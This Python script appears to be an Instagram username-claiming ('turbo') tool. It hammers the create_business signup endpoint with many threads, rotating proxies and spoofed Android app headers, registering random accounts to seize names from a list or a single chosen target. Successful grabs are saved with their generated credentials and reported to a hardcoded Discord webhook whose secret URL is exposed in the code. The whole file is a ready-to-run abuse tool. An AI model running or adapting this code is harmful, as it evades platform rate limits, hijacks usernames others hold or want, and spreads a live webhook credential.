try:
    import uuid
    import threading
    import socket
    from time import sleep
    import os
    import ctypes
    from discord_webhook import DiscordWebhook
    from discord_webhook import DiscordEmbed
    from string import *
    from random import *
    from requests_futures.sessions import FuturesSession
    from concurrent.futures import as_completed
    import random
    import string

except Exception as a:
    print(a)


url_two = 'https://b.i.instagram.com/api/v1/accounts/create_business/'




class Reg_Attack():
    def __init__(self,trd,Timeout,Loops):
        self.attemp = 0
        self.threads = trd
        self.Timeout = Timeout
        self.Loops = Loops
        self.us = [
            "Instagram 135.0.0.34.124 Android (21/5.0.2; 240dpi; 540x960; samsung; SM-G530H; fortuna3g; qcom; ar_AE; 154400379)",
            "Instagram 135.0.0.34.124 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)",
            "Instagram 135.0.0.34.124 Android (21/5.0.2; 240dpi; 540x960; samsung; SM-G530H; fortuna3g; qcom; ar_AE; 154400379)",
            "Instagram 135.0.0.34.124 Android (28/9; 380dpi; 1080x2147; OnePlus; HWEVA; OnePlus6T; qcom; en_US; 146536611)", ]
        self.bad = ["signup_block","few minutes","feedback_required", ]
        self.SUCCESS_responses = ["challenge_required", "challenge", "email_is_taken, username_is_taken",]
        self.locks = threading.Lock()
        self.fal = False
        self.name = str("Dady Rayan is Hare")
        self.uid =0
        self.Er = 0
        self.Rs = 0
        try:
            self.target = open("list.txt", "r").read().splitlines()
            self.PROXIES = open("proxies.txt", "r").read().splitlines()
        except Exception as e:
            print(e)
        self.api_list = ['https://b.i.instagram.com/api/v1/accounts/create_business/']
        self.run = True
        self.controll = threading.Event()
        if self.threads <= 250:
            self.future_session = FuturesSession(max_workers=self.threads * 2)
        else:
            self.future_session = FuturesSession(max_workers=self.threads)
        for i in range(int(self.threads)):
            t = threading.Thread(target=self.Attack)
            self.controll.set()
            t.start()
        self.fuc = [self.Attack()]



    def proxies(self):
        self.proxy = str(random.choice(self.PROXIES))
        self.Reproxy = {'http': f'{self.proxy}'}
        return self.Reproxy


    def be_for_Attack(self):
        try:
            self.controll.wait()
            uid = str(uuid.uuid1())
            sss = random.choice(self.us)
            head = {
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTBw==',
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'Accept': '*/*',
                "X-Ig-Connection-Type": "WiFi",
                "Ig-U-Ig-Direct-Region-Hint": "ASH",
                "User-Agent": sss,
                "X-Ig-App-Startup-Country": "SA",
                "X-Mid": "YA_JWQAAAAH7-d-8wxz8-SBWkKd5o",
                "X-Bloks-Version-Id": "fe9365700-caa73d4e913-23f33e40435cbcbe62622f669f86a7f523893f35d365",
                "X-Bloks-Minify-Payload-Cache-Key": "default",
                "X-Pigeon-Rawclienttime": "1621164117.37659",
                "Ig-U-Rur": "FRC",
                "X-Pigeon-Session-Id": uid,
                "X-Ig-App-Id": "12402-4574287414",
                "X-Fb-Http-Engine": "Liger",
                "Accept-Language": "en-US;q=1.0",
                # "X - Fb - Http - Engine": "Liger",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Connection": "close"
            }
            email = lambda len: ''.join(choices(list(ascii_lowercase + digits), k=len))
            self.ds = lambda len: ''.join(choices(list(ascii_lowercase)))
            self.ds_user = self.ds(11) + "--" + self.ds(5)
            random_em = email(20) + "@gmail.com"
            random_p = email(20)
            self.user = random.choice(self.target)
            futures = [self.future_session.post(url_two, proxies=self.proxies(), timeout=self.Timeout, data={'email': random_em,
                'password': random_p,
                'username': self.user,
                'first_name': self.name,
                'device_id': str(uuid.uuid4()),
                "phone_id": str(uuid.uuid4())}, cookies={"csrftoken": "missing","mid":"missing", "ds_user_id": f"{self.ds_user}","rur":"FRC","Ig-U-Ig-Direct-Region-Hint": "ASH"},headers=head) for i in range(self.Loops)]
            for future in as_completed(futures):
                resp = future.result()
                #print(self.user)
                #print(resp.text)
                if "isn't" in resp.text:
                    self.attemp +=1
                    with self.locks:
                        print(f"\r  Attempt : {self.attemp} / Error : {self.Er}", end="")
                if any(i in resp.text for i in self.SUCCESS_responses or "email_is_taken, username_is_taken"):
                    with open(f'@{self.user}.txt', 'a') as file3:
                        file3.write(
                            'Username:' + self.user + '\n' + 'Email:' + random_em + '\n' + 'password:' + random_p + '\n')
                        if len(self.user) < 50:
                            webhook = DiscordWebhook(
                                url='https://discord.com/api/webhooks/837368687605710849/KucsMvDc9kJ9PgJrtSOKZWHavOy7uN56u_Kg_iwZU1bZC-iut78tSWIZ0t6bkw8ZkYLX')
                            embed = DiscordEmbed(title='#Reg ',
                                                 description='@{}\n Attempt >> {}'.format(self.user,
                                                                                          self.attemp),
                                                 color=9109504)
                            embed.set_footer(text="#Rayan|")
                            embed.set_timestamp()
                            webhook.add_embed(embed)
                            response = webhook.execute()
                        with self.locks:
                            print(f"\r  New cliamed > @{self.user}")
                        ctypes.windll.user32.MessageBoxW(0, f"claimed successfully: {self.user} ", "Reg", 0x1000)
                if any(i in resp.text for i in self.bad):
                    self.Er +=1
                    with self.locks:
                        print(f"\r  Attempt : {self.attemp} / Error : {self.Er}", end="")
        except Exception as a:
            #print(a)
            pass

    def Attack(self):
        while self.run:
            self.be_for_Attack()
class Target_attack():
    def __init__(self,trd,Timeout,Loops,):
        self.attemp = 0
        self.threads = trd
        self.us = [
                    "Instagram 135.0.0.34.124 Android (21/5.0.2; 240dpi; 540x960; samsung; SM-G530H; fortuna3g; qcom; ar_AE; 154400379)",
                    "Instagram 135.0.0.34.124 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)",
                    "Instagram 135.0.0.34.124 Android (21/5.0.2; 240dpi; 540x960; samsung; SM-G530H; fortuna3g; qcom; ar_AE; 154400379)",
                    "Instagram 135.0.0.34.124 Android (28/9; 380dpi; 1080x2147; OnePlus; HWEVA; OnePlus6T; qcom; en_US; 146536611)",]
        self.Timeout = Timeout
        self.name = str("Dady Rayan is Hare")
        self.Loops = Loops
        self.bad = ["signup_block","few minutes","feedback_required","generic_request_error" ]
        self.SUCCESS_responses = ["challenge_required", "challenge", "email_is_taken, username_is_taken",]
        self.ds = string.ascii_lowercase
        self.target = input("Target : ")
        self.locks = threading.Lock()
        self.Er = 0
        self.PROXIES = open("proxies.txt", "r").read().splitlines()
        self.api_list = ['https://i.instagram.com/api/v1/accounts/create_business/']
        self.run = True
        self.controll = threading.Event()
        if self.threads <= 250:
            self.future_session = FuturesSession(max_workers=self.threads * 2)
        else:
            self.future_session = FuturesSession(max_workers=self.threads)
        for i in range(int(self.threads)):
            t = threading.Thread(target=self.Attack)
            t.start()

            self.controll.set()
        self.fuc = [self.Attack()]



    def proxies(self):
        self.proxy = str(random.choice(self.PROXIES))
        self.Reproxy = {'http': f'{self.proxy}', 'https': f'{self.proxy}'}
        return self.Reproxy

    def send_discord_webhook(self):
        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/837368687605710849/KucsMvDc9kJ9PgJrtSOKZWHavOy7uN56u_Kg_iwZU1bZC-iut78tSWIZ0t6bkw8ZkYLX')
        embed = DiscordEmbed(title='#Reg ', description='@{}\n Attempt >> {}'.format(self.target, self.attemp), color=9109504)
        embed.set_footer(text="#Rayan|")
        embed.set_timestamp()
        webhook.add_embed(embed)
        response = webhook.execute()


    def be_for_Attack(self):
        self.controll.wait()
        uid = str(uuid.uuid1())
        sss = random.choice(self.us)
        head = {
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTBw==',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'Accept': '*/*',
            "X-Ig-Connection-Type": "WiFi",
            "Ig-U-Ig-Direct-Region-Hint": "ASH",
            "User-Agent": sss,
            "X-Ig-App-Startup-Country": "SA",
            "X-Mid": "YA_JWQAAAAH7-d-8wxz8-SBWkKd5o",
            "X-Bloks-Version-Id": "fe9365700-caa73d4e913-23f33e40435cbcbe62622f669f86a7f523893f35d365",
            "X-Bloks-Minify-Payload-Cache-Key": "default",
            "X-Pigeon-Rawclienttime": "1621164117.37659",
            "Ig-U-Rur": "FRC",
            "X-Pigeon-Session-Id": uid,
            "X-Ig-App-Id": "12402-4574287414",
            "X-Fb-Http-Engine": "Liger",
            "Accept-Language": "en-US;q=1.0",
            # "X - Fb - Http - Engine": "Liger",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Connection": "close"
        }
        email = lambda len: ''.join(choices(list(ascii_lowercase + digits), k=len))
        self.ds = lambda len:''.join(choices(list(ascii_lowercase)))
        self.ds_user = self.ds(11) + "--" + self.ds(5)
        random_em = email(20) + "@gmail.com"
        random_p = email(20)
        try:
            self.befor = self.attemp
            sleep(1)
            self.Rs = self.attemp - self.befor
            #print(self.user)
            futures = [self.future_session.post(url_two, proxies=self.proxies(), timeout=self.Timeout, data=
                {'email': random_em,
                'password': random_p,
                'username': self.target,
                'first_name': self.name,
                'device_id': str(uuid.uuid4()),
                "phone_id": str(uuid.uuid4())}, cookies={"csrftoken": "missing","mid":"missing", "ds_user_id": f"{self.ds_user}","rur":"FRC","Ig-U-Ig-Direct-Region-Hint": "ASH"},headers=head) for i in range(self.Loops)]
            for future in as_completed(futures):
                resp = future.result()
                #print(f"{resp.text} \n {resp.status_code}")
                if "isn't" in resp.text:
                    self.attemp +=1
                    with self.locks:
                        print(f"\r  Attempt : {self.attemp} / Error : {self.Er}", end="")
                if any(i in resp.text for i in self.SUCCESS_responses):
                    with open(f'@{self.target}.txt', 'a') as file3:
                        file3.write(
                            'Username:' + self.target + '\n' + 'Email:' + random_em + '\n' + 'password:'  + random_p +  '\n')
                        if len(self.target) < 50:
                            self.send_discord_webhook()
                        with self.locks:
                            print(f"\r  New cliamed < @{self.target}")
                        ctypes.windll.user32.MessageBoxW(0, f"claimed successfully: {self.target} ", "Reg",0x1000)

                if any(i in resp.text for i in self.bad):
                    self.Er +=1
                    with self.locks:
                        print(f"\r  Attempt : {self.attemp} / Error : {self.Er}", end="")
                else:

                    pass
        except Exception as a:
            #print(a)
            pass
    def Attack(self):
        while self.run:
            self.be_for_Attack()


def Reg_Attack2():
    ask = int(input("1-list - 2-Target : "))
    if ask == 1:
        trd = int(input("Threads : "))
        Timeout = int(input("Timeout : "))
        Loops = int(input("Loops : "))
        Reg = Reg_Attack(trd,Timeout,Loops)
    elif ask == 2:
        trd = int(input("Threads : "))
        Timeout = int(input("Timeout : "))
        Loops = int(input("Loops : "))
        Reg = Target_attack(trd, Timeout, Loops)
    while 1:
        Reg


Reg_Attack2()











